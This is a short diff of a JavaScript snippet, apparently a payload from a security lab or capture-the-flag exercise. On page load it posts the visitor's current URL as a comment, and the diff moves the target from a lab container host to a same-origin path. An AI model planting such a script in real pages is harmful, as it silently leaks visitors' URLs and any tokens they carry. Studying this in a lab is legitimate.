@@ -9,7 +9,7 @@ window.onload = function () {
 	formData.append("creator", "fromBot2");
 	formData.append("body", window.location.href);
 
-	fetch("https://unknowncontainer.br2.bughuntr.net/comment/ca5c0e56-eeaa-4bbc-a629-43de84db56c7",{
+	fetch("/comment/ca5c0e56-eeaa-4bbc-a629-43de84db56c7",{
 		method: 'POST',
 		body: formData
 	});
